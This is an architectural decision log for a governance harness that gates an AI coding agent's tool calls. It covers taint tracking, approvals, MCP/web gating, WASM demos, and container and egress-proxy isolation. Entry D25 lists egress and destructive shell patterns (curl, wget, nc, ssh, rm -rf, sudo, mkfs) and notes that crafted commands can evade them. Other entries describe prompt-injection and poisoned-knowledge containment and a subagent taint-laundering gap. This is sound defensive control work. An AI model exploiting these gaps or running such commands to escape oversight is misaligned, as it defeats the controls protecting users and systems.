# Decision Log

Architectural decisions for ai2rules (the umbrella project; flagship layer = the
governance harness), with the alternatives we weighed and why we chose what we did.
ADR-lite: one entry per decision.

**Why this exists:** so a choice can be revisited later without re-deriving the
context — especially the alternatives we *didn't* take.

**How to use it:** append a new `D<n>` entry when you make a decision that closes
off a real alternative. Keep entries short; link to the epic in `PLAN.md`, the
commit, or the code. Status is `Accepted` unless later `Superseded by D<n>`.

> Entries D1–D11 were reconstructed from project artifacts (commits, `PLAN.md`,
> the plan files, code comments, `CLAUDE.md`) rather than a contemporaneous log,
> so dates are approximate. D12 onward are recorded as decisions are made.

| Field | Meaning |
|---|---|
| **Decision** | what we chose |
| **Alternatives** | the options we rejected |
| **Why** | the deciding rationale |

---

## D1 — `harness-types` as the foundation crate
- **Epic:** E0 · **Status:** Accepted
- **Decision:** Put the language-neutral contracts in a dedicated `harness-types`
  crate that every other crate depends on inward; keep `IntentIR` in
  `world-kernel`.
- **Alternatives:** Define the contracts inside `world-kernel`.
- **Why:** Lets `executor`, `trace-store`, and the adapters depend on the
  contracts **without** depending on the kernel, while Rust's privacy still
  *seals* `IntentIR` (only `IRBuilder::build` can mint one).

## D2 — Hard taint invariant is a code floor, not manifest-driven
- **Epic:** E2 · **Status:** Accepted
- **Decision:** Enforce the taint × side-effect floor in code (`invariants.rs`),
  run before manifest policy; the manifest's `transition_policies` layer
  *additional* taint policy on top in disposition.
- **Alternatives:** Drive the floor purely from manifest `taint_rules`.
- **Why:** A manifest must never be able to *weaken* the floor. The default
  world's rules coincide with it — harmless overlap; the floor holds even if a
  manifest omits them.

## D3 — Minimal, no-dependency schema validation
- **Epic:** E2 · **Status:** Accepted
- **Decision:** Hand-rolled argument validation (required keys, declared-property
  types, `enum`/`const`) in `world-kernel/schema.rs`.
- **Alternatives:** Pull in a JSON Schema crate.
- **Why:** Keeps the lean offline dependency set; the default world carries no
  schemas yet. Full Draft validation deferred as later hardening.

## D4 — Kernel-side `ExecutionSpec` assembly
- **Epic:** E3 · **Status:** Accepted
- **Decision:** `world-kernel::build_execution_spec` mints the spec from a sealed
  `IntentIR`; `KernelOutcome::Evaluated` carries the intent so an `ALLOW` can be
  lowered. Runtime config arrives via `ExecEnv` (kernel stays pure).
- **Alternatives:** Build the spec in a separate orchestrator step.
- **Why:** The kernel is the sole producer of the only object that crosses the
  boundary (architecture §6); the `executor` keeps **no** dependency on the
  kernel and evaluates no policy.

## D5 — Pragmatic-real execution handlers
- **Epic:** E3 · **Status:** Accepted
- **Decision:** `read` real (readable-root checked); `apply_patch` as a structured
  full-file write (writable-root enforced); `run_command` real via std subprocess
  with a thread-drained deadline + direct-child kill; `SIMULATE` for all.
- **Alternatives:** Simulation-first (EXECUTE stubbed); full-real (unified-diff
  apply + process-group kill-tree now).
- **Why:** Offline-buildable (no diff crate available); process-group kill-tree
  and OS isolation are E8's job, not E3's.

## D6 — Full E4 scope; defer the Rego parity mirror
- **Epic:** E4 · **Status:** Accepted
- **Decision:** Ship record + redaction + replay + drift report + bundle
  (E4.1–E4.5); defer the cross-implementation Rego mirror (E4.6).
- **Alternatives:** Core only (E4.1–E4.3).
- **Why:** Replay + drift + bundle are what make M1's "deterministic core"
  demonstrable; a second-language parity harness adds little before there's a
  benchmark suite.

## D7 — Minimal `*`-glob redaction, no dependency
- **Epic:** E4 · **Status:** Accepted
- **Decision:** Redact JSON values whose key/dotted-path matches a manifest
  pattern via a small `*`-wildcard matcher.
- **Alternatives:** Add a glob crate for full `**`/path semantics.
- **Why:** Lean deps; masking keeps keys present and values string-typed so it
  doesn't change representability. Full glob deferred.

## D8 — Consumer crates depend inward; dev-deps break would-be cycles
- **Epic:** cross-cutting · **Status:** Accepted
- **Decision:** Replay/spec/approvals live where their inputs are: `trace-store`
  depends on `world-kernel` + `compiler`; `world-kernel` uses `compiler`/
  `executor`/`tempfile` as **dev-deps** for tests/demos only.
- **Alternatives:** Keep `trace-store` storage-only with replay elsewhere; avoid
  any cross-crate test deps.
- **Why:** The kernel depends on neither `trace-store` nor `executor`, so there's
  no cycle; the dependency graph still flows inward to `harness-types`.

## D9 — Offline `ModelClient` trait; defer a live HTTP client
- **Epic:** E5 · **Status:** Accepted
- **Decision:** `agent-core` defines a `ModelClient` trait + a deterministic
  `ScriptedModel`; the Anthropic piece is pure format translation. No network,
  no async, no API key.
- **Alternatives:** Add a real Anthropic HTTP client (reqwest + tokio) now.
- **Why:** Keeps CI offline and the loop deterministic, matching the kernel's
  posture. A live client is a later, feature-gated add.

## D10 — Anthropic-only adapter for now
- **Epic:** E5 · **Status:** Accepted
- **Decision:** Build only the Anthropic adapter (E5.1–E5.5); defer OpenAI/Gemini
  (E5.6).
- **Alternatives:** Build all three adapters now.
- **Why:** One adapter proves the single gate end-to-end; the others share the
  neutral `ToolCall` contract, so adding them later is mechanical.

## D11 — Model proposals carry Trusted provenance; taint is the containment
- **Epic:** E5 · **Status:** Accepted
- **Decision:** The orchestrator proposes with the developer's (Trusted)
  authority; containment of tainted-data-driven actions comes from the **taint**
  carried in `EvalContext`, not from lowering the proposal's trust.
- **Alternatives:** Give model proposals a low trust level.
- **Why:** Low trust would make every non-read action `ABSENT` by capability,
  defeating the loop; taint × side-effect is the correct containment mechanism.

## D12 — ApprovalStore lives in `trace-store`
- **Epic:** E6 · **Status:** Accepted
- **Decision:** The durable approval store is a module in `trace-store`
  (append-only JSONL transitions, folded on load), reusing its serde/JSONL/io
  patterns and `compiler::sha256_hex` for the params-binding hash.
- **Alternatives:** A new `approval-store` crate; or in `agent-core`.
- **Why:** `trace-store` is already the durable-persistence home and carries the
  needed deps; a new crate would re-establish the same dependencies for one
  module. (Trade-off: approvals are operational state, not audit — colocated for
  pragmatism, separable later if it grows.)

## D13 — E6 wires approvals through the full loop
- **Epic:** E6 · **Status:** Accepted
- **Decision:** Beyond the kernel branch + store, wire approvals into the
  orchestrator: an `ApprovalPolicy` (`Manual`/`AutoApprove`/`AutoReject`) + an
  `ExecutionMode` on the session, with a demo showing `ASK → approve → resume →
  ALLOW` and `BACKGROUND → DENY`.
- **Alternatives:** Kernel + store only, deferring loop wiring/demo.
- **Why:** End-to-end wiring is what actually demonstrates invariants 9 and 10,
  and completes Milestone 2.

## D14 — MCP/web via offline mock transports
- **Epic:** E7 · **Status:** Accepted
- **Decision:** MCP and web go through pluggable `McpTransport` / `WebFetcher`
  traits with deterministic mock impls; MCP dispatch and web fetch flow through
  the same IntentIR/descriptor/provenance gate and the executor's drift check,
  with no network or async.
- **Alternatives:** Real stdio/HTTP MCP transport + real web client (reqwest) now.
- **Why:** Keeps CI offline and deterministic, matching the kernel and the E5
  model client (D9). Real transports are a later, feature-gated add.

## D15 — Full E7 in one pass
- **Epic:** E7 · **Status:** Accepted
- **Decision:** Ship scoped-capability machinery (E7.4/E7.5, invariant 12) + MCP
  dispatch (E7.1) + MCP descriptor drift (E7.2) + web channel (E7.3) together,
  via the mock transports; plus `git_status`/`git_diff` and `call_known_mcp_tool`.
- **Alternatives:** Scoped caps + drift only, deferring live MCP/web handlers.
- **Why:** With mock transports the whole epic is deterministic and offline, so
  there's no reason to split; satisfies invariants 7, 11, 12 in one move.

## D16 — Scoped-cap spec keys on the scoped action name
- **Epic:** E7 · **Status:** Accepted
- **Decision:** `build_execution_spec` keeps the spec's `action` = the scoped
  capability's name (e.g. `run_tests`) and carries the scoped cap's descriptor
  hash; the executor registers each scoped cap under its own name mapped to the
  base action's handler kind.
- **Alternatives:** Rewrite the spec's action to the base action (`run_command`).
- **Why:** The descriptor hash that drift-checks (invariant 11) is the scoped
  cap's; keying on the scoped name keeps the spec, the registered hash, and the
  audit trail consistent — rewriting to the base would mismatch the hash.

## D17 — World Authoring Tool architecture
- **Epic:** E11 · **Status:** Accepted (UI stack refined by D18)
- **Decision:** Adopting the 3-column UI pattern of `mcp-tool-projection` (visualizing live tools + scoped caps vs. manifest YAML vs. effective tool surface & decisions). The implementation uses a dual stack: a TypeScript React/Vite SPA hosted locally from a thin Rust HTTP API (integrated directly into the harness CLI, e.g. via `cli-harness serve`).
- **Alternatives:**
  1. Build a pure Rust Terminal User Interface (TUI).
  2. Implement the manifest evaluation/projection rules in TypeScript/Node for the UI backend to keep the tool standalone.
- **Why:** A browser-based UI is far more expressive and faster to develop for complex JSON/YAML hierarchies and side-by-side comparative views than a Rust TUI. However, rebuilding the complex governance kernel logic (taint propagation, budget checking, descriptor hashing, ontology resolving, scoped cap argument stripping) in TypeScript would lead to double maintenance and inevitable drift. A thin Rust HTTP endpoint wraps the actual production compiler/kernel, ensuring 100% fidelity.

## D18 — Authoring UI ships as one embedded HTML page, not a React/Vite SPA
- **Epic:** E11 · **Status:** Accepted · **Refines:** D17
- **Decision:** `harness serve` hosts the World Authoring Tool as a single static
  HTML/JS page (`crates/cli-harness/src/ui.html`, embedded via `include_str!`)
  served by a tiny std-only **blocking** HTTP server (`cli-harness/src/serve.rs`)
  over two JSON endpoints. No JavaScript framework, build step, or runtime
  dependency; the page is vanilla JS and the binary embeds it.
- **Alternatives:** The React/Vite SPA of D17; a Rust TUI; an async HTTP stack
  (axum/tokio) for the API.
- **Why:** D17's core decision — preview through the *real* compiler/kernel via a
  thin Rust HTTP API (100% fidelity, no governance logic reimplemented) — is
  unchanged and met. But a React/Vite SPA would drag a Node toolchain,
  `node_modules`, and a second package ecosystem into a Rust repo whose whole
  posture is lean/offline/no-extra-deps, and an async server would add
  tokio/axum for a single-user localhost tool. One vanilla page over a blocking
  std listener delivers the same 3-column editor / surface / decision-matrix UX
  with zero new dependencies and nothing to build. The richer SPA (and the
  deferred E11.4 export / E11.5 LLM-assist features) can be reintroduced later if
  the UI outgrows a single file.

## D19 — Govern Claude Code by emitting config from one WorldManifest
- **Epic:** E13 · **Status:** Proposed (sketch; E13.2 first slice landed, emitter is E13.3)
- **Decision:** Apply the harness to the **Claude Code** host by *compiling* one
  `WorldManifest` into Claude Code config, rather than hand-authoring that config
  or reimplementing governance in JS. A `harness compile --target claude-code`
  subcommand emits, from the same `CompiledWorld` the harness runs on:
  - **`.claude/cc-world.json` + a `PreToolUse` hook** (`world-gate.py`) — the
    runtime `decide()` gate over **native** tools: ABSENT-for-native, the taint
    floor (`transition_policies`), and ASK (`approval_required`). *(E13.2, shipped
    as a hand-written first slice.)*
  - **`.mcp.json` → an MCP projection shim** — projection + scoped-capability
    arg-locking for MCP tools, reusing `safe-mcp-proxy` / `mcp-tool-projection`.
    *(E13.4.)*
  - **subagent `tools` allowlists** — one subagent per trust level (the
    capability-by-trust matrix → distinct projected surfaces).
  - optionally a **`PostToolUse` logging hook** for audit/trace parity + redaction.
- **Manifest → host mapping:** projected actions + capability matrix → subagent
  allowlists / `cc-world.projected_tools`; `transition_policies` (taint ×
  side-effect) → `cc-world.egress`/`taint_sources`; `approval_required` →
  `cc-world.ask`; `scoped_capabilities` literals → MCP-shim re-exposed schemas;
  `observability.redact` → the PostToolUse logger.
- **Alternatives:** (1) hand-author `settings.json` + `.mcp.json` + allowlists
  separately — *this is the drift problem we exist to solve*; (2) one big Claude
  Code **plugin** bundling agents/commands/hooks/MCP — viable later as the
  distribution wrapper, but still wants a single compiled source; (3) reimplement
  the kernel logic inside the hook in JS/TS — rejected for the same reason as
  D17/D18 (double maintenance, inevitable drift).
- **Why:** one `CompiledWorld` is the single source of truth, so Claude Code's
  otherwise-scattered governance (settings permissions + `.mcp.json` + subagent
  allowlists + hooks) can't drift; the emitter is a **pure projection**
  (deterministic, no LLM); and the hook layer governs **native** tools
  (`Bash`/`Edit`/`Write`/`Read`/`WebFetch`) that an MCP proxy alone can't see —
  the highest-leverage gap. It also dogfoods the harness on its own repo.
- **Known limits (host fidelity):** `PreToolUse` gates (allow/deny/ask) but does
  not reliably *rewrite* native-tool args — so scoped-cap arg-locking lives in the
  MCP shim, while native tools are validate-and-deny. Taint is heuristic on this
  host (inferred from which tool touched an untrusted source; monotonicity kept in
  the sidecar). Fidelity is highest for ABSENT (surface), the taint floor, and
  ASK — exactly the three the E13.2 slice ports.

## D20 — Cross-agent taint rides Claude Code's shared in-process session id
- **Epic:** E13 · **Status:** Accepted (empirical)
- **Decision:** Do not build explicit parent↔subagent taint propagation for
  in-process subagents. An experiment (instrumented `world-gate.py` debug log +
  a spawned subagent) showed Claude Code assigns **one shared `session_id` to the
  whole in-process agent tree** (subagents are distinguished by `agent_id` /
  `agent_type`, not a new session). Since taint is keyed by `session_id`, child
  and parent already read/write the *same* sidecar — propagation is automatic and
  conservative (a subagent touching untrusted data taints the whole tree). Add a
  `SubagentStop` hook (`taint-notify.py`) that (a) surfaces taint to user+model
  when a subagent finishes (observability — the floor isn't silent), and (b)
  unions a child's taint into a *distinct* parent session if the host ever exposes
  a parent link.
- **Alternatives:** (1) Build per-agent taint stores + explicit propagation —
  rejected: redundant in-process, and it presumed a gap the experiment disproved.
  (2) Ignore subagents — rejected: a fail-open laundering gap (the intra-run
  ZombieAgent) *if* the shared-session assumption were ever false.
- **Why:** verify the host's real semantics instead of assuming them; lean on the
  shared session where it holds, name/enforce the invariant ourselves where it
  doesn't.
- **Known limit:** agents that run **isolated** (separate worktree / background /
  remote) get a distinct `session_id` *and* a distinct `.claude/state`, so the
  shared-sidecar propagation no longer applies and a local hook can't reach the
  child's state. Out of scope for the local-sidecar approach (the real fix is the
  in-data taint of the in-process kernel, or a shared taint store).

## D21 — Containerized "governed Claude Code" as the system under test + E8 floor
- **Epic:** E13 / E8 · **Status:** Accepted
- **Decision:** Ship a containerized Claude Code (`docker/Dockerfile` + `run.sh` +
  README) that runs the repo's PreToolUse governance under OS-level isolation.
  Two roles: (1) **separation** — the agent under test and the dogfooding config
  live in a throwaway container, not the host dev session; (2) **enforcement
  floor (E8)** — the container physically enforces what the hooks merely decide
  (network egress policy, non-root, `--cap-drop ALL`, write confinement via
  mounts). Network is the egress floor: `none` (offline, default), `bridge` (live,
  hook-only), or an egress-allowlist proxy (live + contained — the real E8). A
  shared named-volume taint store carries taint across instances (the D20 fix when
  locality breaks).
- **Alternatives:** a single host instance (status quo — conflates SUT and dev,
  no OS floor); a VM / microVM (heavier isolation, slower loop); hooks only (no OS
  enforcement — decisions without physics).
- **Why:** the container is where the harness's *declared* network-disable /
  writable-roots constraints become *enforced*, and it keeps experiments
  (restricting tools, triggering taint, running injection→egress attacks) out of
  the session you develop in. Decisions (hooks) + physics (container) = defense in
  depth.
- **Live-contained floor (shipped):** `docker/compose.yaml` + `docker/egress-proxy/`
  put the agent on an `internal` no-gateway network whose only egress is a
  tinyproxy that allowlists `anthropic.com` (CONNECT :443). Verified: from the
  agent, `api.anthropic.com` connects (HTTP 401), `example.com` is denied by the
  proxy, and bypassing the proxy env has no route. `--network none` (run.sh) still
  blocks the model API entirely, so that mode stays offline-only.

## D22 — Interactive demos run the real kernel via WASM, served same-origin
- **Epic:** E14 / E12 / E11 · **Status:** Accepted (direction); implementation planned
- **Decision:** Make live, interactive demos on `ai2rules.dev` run the **actual**
  kernel + compiler compiled to WebAssembly, shipped as a static Astro island —
  so the decision logic executes client-side, same-origin, with no backend and no
  reimplementation of governance. As an **interim** (no wasm yet), ship recorded
  interactivity via a **self-hosted asciinema player** (player vendored under
  `blog/public/vendor/`, casts under `blog/public/casts/`) — playback, but still
  same-origin and faithful to a real run.
- **Alternatives:** (a) **reimplement the gate/kernel in TypeScript** — fast and
  tiny, but a second copy of the decision logic that will drift from the Rust
  source, which is fatal for a product whose whole claim is "one deterministic
  source of truth"; (b) **Pyodide running `world-gate.py` unmodified** — faithful
  and zero-rewrite, but a ~6–10 MB runtime download; (c) **self-hosted
  `harness serve` backend behind a reverse proxy** — real binary and arbitrary
  input, but arbitrary input → a real binary reintroduces the exact blast radius
  the harness exists to contain (would itself need the E13.7 governed container);
  (d) **third-party playground** (StackBlitz/Codespaces) — violates the
  same-origin / no-domain-leaving requirement outright.
- **Why:** the kernel is pure by design (no I/O, no LLM, no mutable state) and its
  deps are wasm-clean (`serde_json`/`serde_yaml`/`sha2`/`shell-words`), so wasm is
  a packaging exercise, not a rewrite — and it is the only option that is at once
  same-origin, fully interactive, backend-free, and **provably the real kernel**
  (a CI golden-vector suite, E14.4, pins wasm verdicts to the native kernel). The
  asciinema interim buys an honest same-origin demo today without betting the
  fidelity story on a hand-written JS port.
- **Spike (validated):** the pure `preview` was extracted into a shared
  `harness-preview` crate (used by both `harness serve` and a new `harness-wasm`
  `wasm-bindgen` crate), `wasm-pack build --target nodejs` compiled the whole
  stack (sha2 / serde_yaml / kernel / compiler) to `wasm32`, and a Node smoke
  test (`crates/harness-wasm/smoke-test.cjs`) confirmed the kernel decides
  client-side — clean `fetch_web` → Allow, tainted → Deny (`taint_invariant`).
  The premise holds: no JS reimplementation, one shared implementation, real
  verdicts in the browser runtime. (Debug `.wasm` is ~2.7 MB; release + `wasm-opt`
  size tuning is E14.2.)

## D23 — Unify the sibling repos under one thesis: Agentic Governance at the stochastic–deterministic border
- **Status:** Accepted (positioning)
- **Decision:** Treat the harness and the sibling reference repos as **one
  project** seen from layers, not separate efforts. Headline **category** =
  *Agentic Governance*; core **thesis/mechanism** = *the stochastic–deterministic
  border* ("design-time stochastic, runtime deterministic"). Five layers, each a
  fragment applying the same border move to a different governed resource: Action
  (this harness / `world-kernel`), Capability (`cedar-world-playground`), Knowledge
  (`context-engine` + HippoRAG-2-style retrieval), Intent
  (`intent-memory-engine`/`intentos-core`), Substrate
  (`llm-service-stack`/`personal-llm-box`, peripheral). Canonical spine is
  `docs/THESIS.md`; the cross-layer claim is demonstrated by
  `agent-core/examples/poisoned_knowledge_demo` (a poisoned KB document cannot
  escalate into a forbidden action — the taint floor flips an identical
  `fetch_web` from ALLOW to DENY).
- **Alternatives:** (a) **keep them as separate projects** — honest about their
  different maturities, but forgoes the compounding narrative and the shared
  primitive kit (taint, sealed intent, ABSENT≠DENY, capability projection) that
  actually makes them one idea; (b) **lead with the thesis name alone**
  ("Stochastic–Deterministic Border") — sharpest for engineers but opaque to a
  security/enterprise audience and to search; (c) **lead with the category alone**
  ("Agentic Governance") — legible but generic, loses the mechanism that is the
  real contribution; (d) **IntentOS-only branding** (from `intent-memory-engine`)
  — a product name, not a thesis, and overweights the least-mature fragment.
- **Why:** category + thesis layered keeps the work legible to outsiders *and*
  precise to engineers, and the §5 claim — one primitive kit governs actions,
  capabilities, knowledge, and intent — is what makes five fragments cohere. The
  umbrella *form* (meta-repo vs docs site vs Cargo-workspace consolidation) is
  deliberately deferred: the structure should fall out of the cross-layer demo, so
  it will be recorded as a separate decision when taken.

## D24 — Hosts reach the kernel through a host-neutral process ABI (`harness gate`), via thin adapters — never reimplementation
- **Epic:** E13/E14 (integration port; refines D19) · **Status:** Accepted (design; implementation pending)
- **Decision:** Make the governance kernel **host-independent** by exposing it as a
  single neutral **process ABI** and integrating every host through a **thin host
  adapter** that calls it — never by re-deriving governance in the host's language.
  Concretely:
  - A `harness gate` subcommand reads one **GateRequest** JSON on stdin and writes
    one **GateResponse** JSON on stdout (schema: [`docs/harness-gate-abi.md`](docs/harness-gate-abi.md)).
    It is **decision-only** — `ABSENT/ALLOW/DENY/ASK/REPLAN` + the rule that fired +
    the post-call monotonic taint state to persist — and never executes (the host
    runs its own tool on `ALLOW`).
  - The decision is a **pure** `gate(&CompiledWorld, GateRequest) -> GateResponse`
    living beside `preview()` in `harness-preview`, so it is the *same* code natively
    and in WASM (extends the E14.4 native↔wasm conformance guard to gate verdicts).
  - A **host adapter** per host is a thin shim: map the host's intercept event →
    GateRequest, restore/persist monotonic taint (sidecar), map GateResponse → the
    host's decision shape. The process **exit code answers "did the gate evaluate?"**
    (0) vs "failed" (≠0; the adapter chooses fail-open/closed) — it does **not**
    encode the verdict.
  - The **MCP proxy** is one such adapter that taps the MCP wire, governing any
    MCP-speaking host with no per-host code (MCP-routed tools only, not native tools).
- **Consequence (the property we wanted):** supporting a new host of the same
  effect-class (Claude Code, a Hermes agent, Codex CLI) = **one adapter + one world
  manifest, with the kernel binary byte-identical.** Two adapters is not a kernel
  change; the kernel stays the single deterministic source of truth across every
  constellation.
- **Refines D19 / supersedes the E13.2 slice:** D19 already says the hook runs "the
  runtime `decide()` gate" and rejects JS/TS reimplementation — it just never named
  the mechanism, and `world-gate.py` shipped as a **Python reimplementation** of
  ABSENT/taint/ASK, contradicting both D19's intent and D22's "one source of truth."
  This ABI is that mechanism: the hook collapses to a ~15-line adapter calling
  `harness gate`, and the governance rules (incl. taint sources) move out of Python
  into the compiled `WorldManifest`.
- **Alternatives:** (a) **adopt a generator (MetaHarness/`agent-harness-generator`)
  as the foundation** — rejected: it is a *packaging factory* (scaffolds branded
  agent packages with policy/release gates), a layer *above* this stack, not a
  deterministic runtime kernel; at most a distribution channel that could itself
  call this ABI. (b) **fork a host (Claude Code / a Hermes agent) and build
  governance in** — rejected: couples us to one host's release treadmill and makes
  us *become* a host, forfeiting the neutrality that is the whole goal. (c)
  **per-host reimplementation** (today's Python hook; a future JS port for the next
  host) — rejected: N drifting copies, kernel not actually deciding — the exact
  failure D17/D18/D22 exist to close. (d) **in-process linking only** (every host
  links the Rust lib) — rejected as the *sole* path: fine for a Rust host, but
  impossible for a Python hook or a TS host; the process ABI is the
  lowest-common-denominator that *also* subsumes the library and WASM embeddings.
  (e) **encode the verdict in the exit code** — rejected: overloads "process failed"
  with "DENY" and bakes one host's hook convention into a host-neutral ABI; the
  adapter owns that translation.
- **Why:** the kernel is already pure (`decide(world, call, prov, ctx)`) and reached
  only through a neutral contract, so a stdin/stdout JSON ABI is a *packaging*
  exercise, not new logic — and it is the one move that makes "same kernel across
  many constellations" *true* rather than aspirational, ends the
  reimplementation-drift class for good, and unifies native, WASM, hook, and proxy
  behind one conformance-tested decision function.
- **Known limit (inherited from D19/D20):** on hosts where `PreToolUse` can't
  rewrite args, scoped-cap arg-locking stays validate-and-deny via the MCP shim, and
  taint remains heuristic (per-tool/per-path) because the host exposes no in-data
  provenance — the ABI *relocates* that heuristic from Python into the compiled
  world; it does not make it exact.

## D25 — Claude Code world is a real WorldManifest; shell commands are adapter-classified into distinct actions
- **Epic:** E13.8 (extends D19/D24) · **Status:** Accepted
- **Decision:** Express the Claude Code host world as a real `WorldManifest`
  (`.claude/cc-world.yaml`), compiled by the real compiler and governed per call via
  `harness gate` — replacing the bespoke `cc-world.json` schema. Claude Code's
  native tools map onto manifest actions, most 1:1. Because the kernel decides at
  **action granularity** and must not parse shell syntax, the host adapter
  **classifies `Bash` by command shape into three distinct actions**: `Bash`
  (Process), `Bash_network` (egress patterns curl/wget/nc/ssh/… → side_effect
  Network), and `Bash_destructive` (rm -rf/sudo/mkfs/… → `approval_required`). The
  manifest declares each action's policy; the adapter only chooses which action a
  given command *is*. Verified end-to-end: tainted `WebFetch`/`Bash_network` → DENY
  (`taint_invariant`), `Bash_destructive` → ASK, clean reads → ALLOW, unknown tool →
  ABSENT — all by the real kernel.
- **Deferred (path-based read-taint):** `cc-world.json` also tainted the session on
  *reading* an untrusted path (`repos/`, `untrusted/`). The v1 gate escalates
  post-call taint by **side-effect class** (Network/External/Memory), not by
  read-path, so this heuristic is **not yet preserved**. The faithful fix is either
  (a) escalate by the call's `source_channel` trust (the adapter tags an untrusted
  read with an untrusted channel) or (b) an untrusted-read-roots manifest field —
  both design-level, recorded here as the open follow-up per *decisions-outrank-code*
  rather than patched ad hoc in the adapter.
- **Alternatives:** (a) **command-pattern rules in the manifest/kernel** (the kernel
  regex-matches shell commands) — rejected: puts shell-syntax parsing into the pure
  kernel, and patterns are host-specific; the adapter is the right place for
  host-shape normalization. (b) **mark `Bash` as `Network` wholesale** — rejected:
  over-broad, every `ls`/`cat` would be treated as egress and blocked under taint.
  (c) **keep `cc-world.json` + the Python reimplementation** — rejected by D24
  (drift / two sources of truth). (d) **one synthetic `Bash` action with arguments
  inspected by the kernel** — same shell-parsing-in-kernel objection as (a).
- **Why:** a real manifest makes the Claude Code world the *same* compiled artifact
  the harness runs on (one source of truth, D24), and action-level classification
  keeps the kernel pure while still catching the high-leverage cases (egress under
  taint, destructive commands). The boundary is honest: *what a command is*
  (host-syntactic) is the adapter's job; *what an action may do* (policy) is the
  manifest's.
- **Known limit:** classification fidelity is bounded by the adapter's pattern set
  (a crafted command can evade the egress patterns) and `PreToolUse` can't rewrite
  args — the same host-fidelity ceiling as D19. The manifest is the floor, not a
  complete sandbox; the E13.7 container + egress proxy is the enforcement backstop.

## D26 — Validate the gate adapter in the containerized SUT; don't rewrite the live host hook
- **Epic:** E13.8 (extends D21/D24/D25) · **Status:** Accepted
- **Decision:** Realize the D24 host adapter by **adding a new shim**
  (`.claude/hooks/world-gate-adapter.py`) that shells out to `harness gate --world
  .claude/cc-world.yaml`, and **validate it in the E13.7 container SUT** — *not* by
  editing the live `world-gate.py` that governs the host dev session. The live hook
  and its `settings.json` wiring stay untouched; cutting the live host over (and
  retiring `world-gate.py` + `cc-world.json`) is a separate, opt-in step. The shim is
  pure plumbing — Bash classification (D25), taint-sidecar restore/persist, the
  `harness gate` call, and decision→`PreToolUse` mapping (DENY→deny, ASK→ask, else
  passthrough; fail-open) — **no decision logic**.
- **Why:** (1) the live hook governs *this* session; rewriting it in place risks
  weakening/breaking our own governance for no gain, since the adapter is a new
  artifact provable in isolation. (2) The container is what E13.7/D21 exists for —
  disposable (a shim bug can't harm the host), **backstopped by the egress proxy**
  (so the v1 gate's deferred path-taint gap, D25, is covered by the network floor —
  defense in depth), and the realistic deployment target. (3) Neither environment
  loses protection during the migration: the container has the proxy floor; the live
  host keeps the full (path-taint-capable) Python hook until a deliberate cutover.
- **Alternatives:** (a) **edit the live `world-gate.py` in place** — rejected:
  self-governance risk, and nothing requires it. (b) **prove the shim by fixtures
  only, skip the container** — weaker: misses the real Claude Code integration and
  the proxy-backstop story (kept as the fast Tier-1 check, not the whole validation).
  (c) **cut the live host over immediately** — premature before the shim is proven
  and before path-taint parity (D25) is resolved.
- **Cost / open sub-choice:** the SUT image must ship the `harness` binary (today it
  ships only `python3`). Packaging — a Rust build stage in the Dockerfile vs a
  mounted host-built static/musl binary — is recorded when taken.

## D27 — Position against Agent Governance Toolkit: govern by ontology + taint + process boundary, not by policy middleware
- **Status:** Accepted (positioning) · **See:** [`docs/THIRD-PARTY-ADOPTION.md`](docs/THIRD-PARTY-ADOPTION.md) (A), [`docs/THESIS.md`](docs/THESIS.md) §8
- **Decision:** Treat Microsoft's **Agent Governance Toolkit (AGT)** as the dominant
  *prior art* for the Action/Capability layers and position explicitly against it —
  neither adopt it nor ignore it. The differentiation is **mechanism, not goal**: AGT
  states our headline almost verbatim ("incapable of misbehaving," not "ask the agent
  to behave") but enforces via **in-process policy middleware** — a
  `default_action: allow` engine evaluating deny rules, with the policy engine and the
  agent sharing **one process boundary** (AGT's own SECURITY note). That is governance
  by *policy decision*. The border governs by *structure*: the dangerous capability is
  **`ABSENT`** (it does not exist in the compiled world, not denied by a rule a model
  can argue with), taint is **monotonic and provenanced**, and the policy layer
  **owns no handler callables** (the process-boundary primitive). Record AGT's MCP
  Security Gateway (tool-poisoning / descriptor drift) as a parallel to
  `safe-mcp-proxy`'s descriptor-drift primitive, and its OWASP-Agentic-Top-10 +
  PromptDefense corpus as **Flywheel discovery input**.
- **Alternatives:** (a) **adopt AGT as the policy layer** — rejected: different stack,
  and a same-process, default-allow rule engine is precisely the LLM-arguable surface
  the border removes; (b) **ignore it** — rejected: it is the most credible same-pitch
  project (Microsoft, MIT, 992 conformance tests), so silence cedes the comparison
  that *is* our contribution; (c) **reframe our positioning to avoid the overlap** —
  rejected: the overlap is the leverage — "deny-rule vs absent capability" only lands
  against a concrete incumbent.
- **Why:** the contrast (policy-decision vs ontology + taint + boundary) is the
  sharpest statement of the thesis and is only legible against the strongest existing
  system. Their conformance-test + RFC-2119-spec discipline is also a *method* worth
  borrowing for our own invariants.
- **Caveat:** AGT ships a package literally named **Agent Hypervisor** — distinct from
  our source `repos/agent-hypervisor` (a different artifact). Disambiguate in any
  public writing.

## D28 — Knowledge layer treats MGP as an interop/vocabulary target, not a runtime to adopt (yet)
- **Epic:** Knowledge layer (context-engine) · **Status:** Accepted (direction) · **See:** [`docs/THESIS.md`](docs/THESIS.md) §4.3, §8
- **Decision:** For the Knowledge layer, treat HKUDS's **Memory Governance Protocol
  (MGP)** as the **interop contract and vocabulary** to align to — its governed-memory
  lifecycle (`Write → Search → Get → Update → Expire → Revoke → Delete → Purge`),
  per-request policy context ("who acts, for whom, under what constraints"), and
  queryable audit map onto what we already mean by *governed recall* — **without**
  adopting its gateway/adapter stack as our runtime now. Align `GLOSSARY.md` and
  context-engine's *external surface* to MGP terms; keep our distinctive move internal
  and independent: the stochastic→deterministic **distillation border** (an LLM
  distills prose into typed Facts / Rules / Capsules at ingestion; deterministic
  governed recall). Speaking MGP on the wire is **gated on a concrete trigger** — a
  second consumer of context-engine that is not our own harness.
- **Alternatives:** (a) **adopt MGP as the knowledge-layer runtime now** — rejected:
  premature (context-engine has no external consumer yet, so importing a
  gateway/adapter stack is cost without a second speaker), and it would subordinate
  our distillation border to someone else's interface before it is proven; (b)
  **ignore MGP, grow vocabulary ad hoc** — rejected: MGP is the clearest existing
  articulation of "governed memory as a protocol," explicitly *peer to MCP*, so
  divergent vocabulary is needless drift; (c) **treat MGP as a competitor** —
  rejected: it standardizes the *interface* to governed memory while our contribution
  is the *distillation border behind it* — composable, not competing (MGP as wire
  contract, distillation as what sits behind it).
- **Why:** aligning vocabulary is near-zero cost and pays off in legibility and a
  clean future integration seam; adopting the protocol implementation is real cost
  that should wait for a real second consumer. Keeps *correctness > completeness*
  (THESIS §4.3) and avoids over-building the least-load-bearing seam.

